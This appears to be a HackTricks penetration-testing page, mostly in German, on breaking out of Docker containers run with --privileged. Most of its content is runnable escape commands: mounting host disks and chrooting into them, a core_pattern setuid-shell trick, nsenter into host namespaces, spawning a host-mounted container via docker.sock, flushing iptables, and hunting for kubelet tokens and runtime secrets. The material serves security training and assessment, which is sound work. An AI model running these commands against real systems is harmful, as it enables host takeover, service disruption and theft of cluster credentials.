# Ausbruch aus `--privileged` Containern

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Ein Container, der mit `--privileged` gestartet wurde, ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere der standardmäßigen Runtime-Schutzmaßnahmen, die normalerweise die Workload von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin von der Runtime und dem Host ab, aber bei Docker ist das übliche Ergebnis:

- alle capabilities werden gewährt
- die device cgroup-Einschränkungen werden aufgehoben
- viele Kernel-Dateisysteme werden nicht mehr nur-lesend gemountet
- standardmäßig maskierte procfs-Pfade verschwinden
- seccomp-Filtering ist deaktiviert
- AppArmor-Einschränkungen sind deaktiviert
- SELinux-Isolierung ist deaktiviert oder durch ein deutlich breiteres Label ersetzt

Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise keinen subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach mit Host-Geräten, hostseitig zugänglichen Kernel-Dateisystemen oder Runtime-Schnittstellen direkt interagieren und dann in eine Host-Shell pivotieren.

## What `--privileged` Does Not Automatically Change

`--privileged` joined nicht automatisch die Host-PID-, Netzwerk-, IPC- oder UTS-Namespaces. Ein privilegierter Container kann weiterhin private Namespaces haben. Das bedeutet, einige Escape-Ketten erfordern eine zusätzliche Bedingung wie zum Beispiel:

- ein Host-Bind-Mount
- Host-PID-Sharing
- Host-Networking
- sichtbare Host-Geräte
- beschreibbare proc/sys-Schnittstellen

Diese Bedingungen sind in realen Fehlkonfigurationen oft leicht zu erfüllen, sind aber konzeptionell getrennt von `--privileged` selbst.

## Escape Paths

### 1. Mount The Host Disk Through Exposed Devices

Ein privilegierter Container sieht in der Regel deutlich mehr Geräte-Knoten unter `/dev`. Wenn das Host-Blockgerät sichtbar ist, ist der einfachste Ausweg, es zu mounten und mit `chroot` in das Host-Dateisystem zu wechseln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Wenn die root partition nicht offensichtlich ist, liste zuerst das block layout auf:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Wenn der praktischere Weg darin besteht, einen setuid-Helfer in einem beschreibbaren Host-Mount zu platzieren, statt `chroot` zu verwenden, denk daran, dass nicht jedes Dateisystem das setuid-Bit respektiert. Eine schnelle hostseitige Fähigkeitsprüfung ist:
```bash
mount | grep -v "nosuid"
```
Das ist nützlich, weil beschreibbare Pfade unter `nosuid`-Dateisystemen für klassische "drop a setuid shell and execute it later"-Workflows deutlich weniger interessant sind.

Die hier ausgenutzten abgeschwächten Schutzmechanismen sind:

- voller Gerätezugriff
- umfangreiche capabilities, insbesondere `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Einen Host-Bind-Mount mounten oder wiederverwenden und `chroot`

Wenn das Root-Dateisystem des Hosts bereits im Container gemountet ist, oder wenn der Container die notwendigen Mounts erstellen kann, weil er privilegiert ist, ist eine host shell oft nur ein `chroot` entfernt:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn kein host root bind mount vorhanden ist, aber host storage erreichbar ist, erstelle einen:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Dieser Pfad missbraucht:

- geschwächte mount-Einschränkungen
- volle capabilities
- fehlende MAC-Isolierung

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Ausnutzung beschreibbarer `/proc/sys` oder `/sys`

Eine der großen Folgen von `--privileged` ist, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Das kann kernel-nahe Schnittstellen offenlegen, die dem Host zugewandt sind und normalerweise maskiert oder read-only gemountet sind.

Ein klassisches Beispiel ist `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Weitere Pfade mit hohem Wert sind:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Dieser Pfad missbraucht:

- missing masked paths
- missing read-only system paths

Verwandte Seiten:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Verwenden Sie vollständige Capabilities für Mount- Or Namespace-Based Escape

Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standardcontainern entfernt werden, einschließlich `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und vieler anderer. Das ist oft ausreichend, um einen local foothold in einen host escape zu verwandeln, sobald eine weitere exponierte Angriffsfläche vorhanden ist.

Ein einfaches Beispiel ist das Mounten zusätzlicher Dateisysteme und die Verwendung von namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Wenn auch der PID-Namespace des Hosts geteilt ist, wird der Schritt noch kürzer:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Dieser Pfad missbraucht:

- the default privileged capability set
- optional host PID sharing

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Ein privileged container hat häufig Host-runtime-Zustand oder Host-Sockets sichtbar. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, ist der einfachste Ansatz oft, die runtime API zu verwenden, um einen zweiten Container mit Host-Zugriff zu starten:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Für containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Dieser Pfad missbraucht:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Nebenwirkungen der Netzisolation entfernen

`--privileged` tritt nicht automatisch dem Host-Netzwerk-Namespace bei, aber wenn der Container außerdem `--network=host` oder anderen Host-Netzwerkzugriff hat, wird der komplette Netzwerk-Stack veränderbar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das ist nicht immer direkt eine host shell, kann aber zu denial of service, traffic interception oder zum Zugriff auf loopback-only management services führen.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host-Secrets und Runtime-State lesen

Selbst wenn ein sauberer Shell-Escape nicht sofort möglich ist, haben privileged containers oft genug Zugriff, um host secrets, kubelet state, runtime metadata und die Dateisysteme benachbarter Container zu lesen:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Wenn `/var` am Host gemountet ist oder die Runtime-Verzeichnisse sichtbar sind, kann dies bereits für lateral movement oder cloud/Kubernetes credential theft ausreichen, noch bevor eine host shell erlangt wird.

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Überprüfungen

Der Zweck der folgenden Befehle ist es, zu bestätigen, welche privileged-container escape families sofort möglich sind.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Was hier interessant ist:

- ein vollständiges Capability-Set, insbesondere `CAP_SYS_ADMIN`
- schreibbarer Zugriff auf proc/sys
- sichtbare Host-Geräte
- fehlendes seccomp- und MAC confinement
- runtime sockets oder host root bind mounts

Jeder einzelne davon kann für post-exploitation ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional ein oder zwei Befehle vom host compromise entfernt ist.

## Verwandte Seiten

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
